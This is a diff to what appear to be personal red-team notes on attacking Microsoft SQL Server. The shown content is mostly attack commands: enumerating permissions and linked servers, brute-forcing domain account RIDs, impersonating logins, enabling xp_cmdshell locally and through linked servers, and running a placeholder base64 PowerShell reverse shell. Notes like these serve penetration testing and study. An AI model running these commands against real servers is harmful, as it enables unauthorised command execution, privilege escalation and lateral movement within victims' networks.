@@ -19,7 +19,10 @@ sqlcmd /S <servername> /d <database> -U <user> -p <pass>
 
 ## Enumeration
 Enumeration : see [[0 SQL Theory and Databases]] and PayloadAllTheThings
+
 #### The Basics
+
+Exploring an MSSQL instance
 ```sql
 -- Check Permissions
 SELECT * FROM fn_my_permissions(NULL, 'SERVER');
@@ -39,14 +42,19 @@ SELECT * FROM <database>.information_schema.tables;
 SELECT * FROM <database>.<table_schema>.<table_name>;
 
 -- mssqlclient.py specifics
-enum_links        -- linked server login mappings
+enum_links        -- linked server login mappings. DOES NOT ALWAYS WORK!!!!!
 enum_logins       -- Check all logins on instance
 enum_impersonate  -- Check users we can impersonate
 ```
+
 #### Linked Servers
+
+Enumerating Linked Servers
 ```sql
 -- Checked for linked servers
-EXEC sp_helplinkedsrvlogin;
+enum_links
+EXEC sp_helplinkedsrvlogin;      -- 3 ways, try all
+EXEC sp_linkedservers;
 	-- ALTERNATIVE : enum_links 
 	-- make note of SRV_NAME
 	-- IF Linked Server, Local Login, Is Self Mapping columns are blank, it likely uses a form of delegation for mapping (the sa)
@@ -56,8 +64,14 @@ EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [<SRV_NAME>];
 
 -- Enumerate DBs on Linked Server
 EXEC ('SELECT name FROM sys.databases') AT [<SRV_NAME>];
+
+-- For executing commands syntax, scroll down to Command Execution section
+EXEC ('EXEC <command> ''<sub-command>''') AT [<SRV_NAME>];  -- general syntax
 ```
+
 #### Manually Enumerate Domain Accounts
+
+Enumerating Domain Accounts from MSSQL
 ```sql
 -- Confirm domain name
 select DEFAULT_DOMAIN() as mydomain;
@@ -94,6 +108,7 @@ for RID in {1000..1500}; do
     [[ "$(echo "$RES" | xargs)" != "NULL" ]] && echo
 done
 ```
+
 ## User Impersonation
 
 Impersonate users 
@@ -110,25 +125,31 @@ EXECUTE AS LOGIN = '<user>'
 
 xp_cmdshell
 ```sql
--- Quick win (might now work)
+-- Quick win (might not work)
 enable_xp_cmdshell
 
 
 -- Enabling xp_cmdshell (Manual)
 SQL> EXECUTE sp_configure 'show advanced options', 1;
 --[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
-
 SQL> RECONFIGURE;
-
 SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
 --[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
-
 SQL> RECONFIGURE;
-
 
 
 -- Reverse shell
 SQL> EXECUTE xp_cmdshell '<command(base64_powershell_revshell)>';
+```
+
+xp_cmdshell on linked servers
+```sql
+-- Example of xp_cmdshell
+EXEC ('EXEC sp_configure ''show advanced options'', 1;') AT [<SRV_NAME>];
+EXEC ('RECONFIGURE;') AT [<SRV_NAME>];
+EXEC ('EXEC sp_configure ''xp_cmdshell'', 1;') AT [<SRV_NAME>];
+EXEC ('RECONFIGURE;') AT [<SRV_NAME>];
+EXEC ('EXEC xp_cmdshell ''whoami''') AT [<SRV_NAME>];
 ```
 
 Other Techniques : For these two, see [[13 Microsoft SQL Server]] red teaming notes
